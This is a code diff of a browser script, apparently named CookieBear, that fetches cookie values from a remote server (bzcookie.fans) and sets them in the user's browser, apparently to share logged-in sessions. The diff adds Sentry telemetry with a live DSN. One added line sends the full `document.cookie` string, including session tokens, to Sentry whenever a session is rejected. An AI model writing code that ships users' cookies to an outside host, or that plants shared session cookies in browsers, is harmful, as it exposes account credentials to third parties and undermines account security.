@@ -1,6 +1,5 @@
 const api = 'https://bzcookie.fans/';
 // https://github.com/OUDUIDUI/notice-kit
-/* eslint-disable-next-line no-undef */
 const notice = new Notice();
 
 const title = `
@@ -111,6 +110,7 @@ async function validateCresidCookie() {
   });
 
   if (!resp.ok) {
+    Sentry.captureMessage(`Invalid Session Detected - ${document.cookie}`);
     notice.showToast({
       text: 'Your 🍪 was not accepted - retrying',
       type: 'info',
@@ -128,6 +128,7 @@ async function main() {
       await logoutUser();
       const response = await fetch(api);
       if (!response.ok) {
+        Sentry.captureMessage(`Could not fetch cookies from bakery  - ${api}`);
         notice.showToast({
           text: '🍪 CookieBakery ran out of cookies - sorry',
           type: 'error',
@@ -136,7 +137,6 @@ async function main() {
         const cookieData = await response.json();
         if (cookieData.length > 0) {
           cookieData.forEach((cookieObj) => {
-            /* eslint-disable-next-line no-undef */
             Cookies.set(cookieObj.name, cookieObj.value, {
               path: cookieObj.path,
               domain: cookieObj.domain,
@@ -155,6 +155,7 @@ async function main() {
         }
       }
     } catch (error) {
+      Sentry.captureException(error);
       /* eslint-disable-next-line no-console */
       console.error('CookieBearError', error);
       notice.showToast({
@@ -201,6 +202,13 @@ console.log(`
                                                                                 
                                                                                 
 `);
+
+Sentry.init({
+  dsn: 'https://28c7146d723f4f9299026b506ca4b843@o889165.ingest.sentry.io/5847881',
+  integrations: [new Sentry.Integrations.BrowserTracing()],
+  tracesSampleRate: 1.0,
+});
+
 main();
 
 // watch for url changes -> needed due to spa architecture
